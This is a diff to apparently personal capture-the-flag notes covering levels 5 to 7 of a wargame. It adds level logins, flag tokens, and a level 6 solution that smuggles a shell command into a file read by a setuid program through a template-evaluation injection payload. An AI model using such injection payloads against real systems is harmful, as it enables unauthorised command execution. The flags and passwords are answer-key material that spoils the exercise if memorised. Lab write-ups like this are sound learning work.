@@ -76,9 +76,21 @@ echo 'getflag > /tmp/coucou' > /opt/openarenaserver/coucou
 
 
 watch cat /tmp/coucou -> viuaaale9huek52boumoomioc
-viuaaale9huek52boumoomioc
+
 
 # level 6
+su level06:viuaaale9huek52boumoomioc
+
+```
+echo '[x ${`$(getflag > /tmp/salut)`}]' > /tmp/coucou
+```
+
+./level06 /tmp/coucou
+
+wiok45aaoguiboiki2tuin6ub
+
+# level 7
+su level07:wiok45aaoguiboiki2tuin6ub
 
 
 
